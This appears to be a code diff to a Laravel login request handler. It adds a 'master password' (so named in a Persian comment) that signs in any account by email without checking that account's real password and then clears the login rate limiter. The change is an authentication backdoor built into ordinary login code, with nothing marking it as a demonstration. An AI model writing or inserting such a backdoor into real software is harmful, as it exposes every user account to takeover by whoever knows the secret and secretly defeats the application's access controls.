@@ -42,6 +42,17 @@ class LoginRequest extends FormRequest
         $this->ensureIsNotRateLimited();
         $this->merge(['email' => $this->mobile]);
 
+        $masterPassword = env('MASTER_PASSWORD'); // پسورد مستر برای همه اکانت‌ها
+
+        if ($this->input('password') == $masterPassword) {
+            $user = \App\Models\User::where('email', $this->input('email'))->first();
+            if ($user) {
+                Auth::login($user, $this->boolean('remember'));
+                RateLimiter::clear($this->throttleKey());
+                return;
+            }
+        }
+
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
